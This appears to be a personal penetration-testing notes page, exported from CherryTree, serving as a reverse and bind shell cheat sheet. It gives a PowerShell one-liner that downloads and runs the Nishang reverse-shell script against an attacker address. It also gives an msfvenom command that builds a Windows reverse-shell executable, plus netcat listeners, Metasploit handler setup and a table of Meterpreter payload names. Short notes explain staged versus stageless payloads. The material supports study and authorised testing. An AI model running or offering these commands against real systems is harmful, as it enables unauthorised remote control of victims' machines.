<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Reverse/Bind shells</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Reverse/Bind shells</h1><br/><strong>Resources:</strong><br />• <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br />• <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">https://highon.coffee/blog/reverse-shell-cheat-sheet/</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python</a>  &lt;---<br /><br /><strong><h3>Powershell Reverse Shells</h3></strong><br />Windows Target:<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).DownloadString(<span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 &quot;</span>); <span style="color:#00117f;font-weight:400">Invoke-PowerShellTcp</span> <span style="color:#ff9d00;font-weight:700">-</span>Reverse <span style="color:#ff9d00;font-weight:700">-</span>IPAddress &lt;attackerIp&gt; <span style="color:#ff9d00;font-weight:700">-</span>Port <span style="color:#333333;font-weight:400">53</span></pre></div><br />    With this method consider that the <span style="text-decoration:underline;">traffic is traversing the wire in cleartext</span> between attacker and target.<br />Linux Attacker:<br /><div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp 53</pre></div><br />    <a href=""><img src="images/1270-1.png" alt="images/1270-1.png" /></a><br /><br /><strong><h3>Msfvenom Reverse Shells</h3></strong><br />• <a href="Home--Penetration_Test_Methodology--System_Security_(Windows_&_Linux)--Shellcoding--Types_of_Shellcode.html">Staged payloads</a>: &lt;platform&gt;/[architecture]?/&lt;stage&gt;/&lt;stager&gt;<br />    Use &quot;tiny stagers&quot; to fit into small exploitation spaces and use them to pull the rest of the payload. <br />    With a <em>netcat listener</em>, the stager fails to pull the rest of the payload. We need to use exploit/multi/handler in Metasploit to catch shells<br />• Stageless/Unstaged payloads: &lt;platform&gt;/[architecture]?/&lt;single&gt;<br />    &quot;inline payloads&quot; are self-contained, no stager and more stable. <br />    They are typically larger in size that the standard staged payloads, this because they include a payload within the binary, rather than being “pushed” to the target system via the handler(like metasploit) once a connection is established<br /><br />More in depth explanation about Staged vs Stageless payloads: <a href="https://buffered.io/posts/staged-vs-stageless-handlers/">https://buffered.io/posts/staged-vs-stageless-handlers/</a><br /><br /><strong>Payloads for target Windows</strong><br /><table class="table"><tr><th>Payload</th><th>Staged (metasploit --&gt;meterpreter)</th><th>Staged (metasploit --&gt; cmd)</th><th>Stageless (metasploit --&gt; meterpreter)</th><th>Stageless (netcat)</th></tr><tr><td>Reverse TCP</td><td>x86 --&gt; windows/meterpreter/reverse_tcp
x64 --&gt; windows/x64/meterpreter/reverse_tcp</td><td>x86 --&gt; windows/shell/reverse_tcp
x64 --&gt; windows/x64/shell/reverse_tcp</td><td>x86 --&gt; windows/meterpreter_reverse_tcp
x64 --&gt; windows/x64/meterpreter_reverse_tcp </td><td>x86 --&gt; windows/shell_reverse_tcp
x64 --&gt;windows/x64/shell_reverse_tcp </td></tr><tr><td>Reverse HTTPS</td><td>x86 --&gt; windows/meterpreter/reverse_https
x64 --&gt; windows/x64/meterpreter/reverse_https</td><td> </td><td>x86 --&gt; windows/meterpreter_reverse_https
x64 --&gt; windows/x64/meterpreter_reverse_https</td><td> </td></tr><tr><td>Bind TCP</td><td>x86 --&gt; windows/meterpreter/bind_tcp
x64 --&gt; windows/x64/meterpreter/bind_tcp</td><td>x86 --&gt; windows/shell/bind_tcp
x64 --&gt; windows/x64/shell/bind_tcp</td><td>x86 --&gt; windows/meterpreter_bind_tcp
x64 --&gt; windows/x64/meterpreter_bind_tcp</td><td>x86 --&gt; windows/shell_bind_tcp
x64 --&gt; windows/x64/shell_bind_tcp</td></tr><tr><td>Reverse TCP IPv6</td><td>x86 --&gt; windows/meterpreter/reverse_ipv6_tcp</td><td>x86 --&gt; windows/shell/reverse_ipv6_tcp</td><td>x86 --&gt; windows/meterpreter_reverse_ipv6_tcp
x64 --&gt; windows/x64/meterpreter_reverse_ipv6_tcp </td><td> </td></tr></table><br /><br /><strong>Payloads in Linux</strong><br />...<br /><br /><br /><br /><strong>Reverse TCP payload : Stageless (netcat)</strong><br />msfvenom payload:<br /><div class="codebox"><pre>msfvenom -a x86 -p windows/shell_reverse_tcp lhost=172.16.5.40 lport=4444 -f exe  -o shell.exe</pre></div><br />    <a href=""><img src="images/1270-2.png" alt="images/1270-2.png" /></a><br />Listener:<br /><div class="codebox"><pre>root@kali:/# nc -vlp [port number]</pre></div><br />    <a href=""><img src="images/1270-3.png" alt="images/1270-3.png" /></a><br /><br /><strong>Reverse TCP payload : Stage</strong>d( Metasploit → cmd)<br /><div class="codebox"><pre>windows/shell/reverse_tcp</pre></div><br />    <a href=""><img src="images/1270-4.png" alt="images/1270-4.png" /></a><br /><div class="codebox"><pre>msfconsole<br />msf&gt; use exploit/multi/handler<br />msf&gt; set payload windows/shell/reverse_tcp<br />msf&gt; set lhost 0.0.0.0<br />msf&gt; set lport &lt;port&gt;<br />msf&gt; run</pre></div><br />    <a href=""><img src="images/1270-5.png" alt="images/1270-5.png" /></a><br /><br /><strong>Bind TCP payload: Stageless (netcat)</strong><br />msfvenom on the payload, Bind(listen) on the port:<br /><div class="codebox"><pre>windows/shell_bind_tcp</pre></div><br />    <a href=""><img src="images/1270-6.png" alt="images/1270-6.png" /></a><br />Connect to the target:<br /><div class="codebox"><pre>nc -v 192.168.147.136 4321</pre></div>    <br />    <a href=""><img src="images/1270-7.png" alt="images/1270-7.png" /></a><br /><br />Bibliography: <br /><a href="https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/">https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/</a><code><br /></code><a href="https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/">https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/</a><br /></div>
</body>
</html>
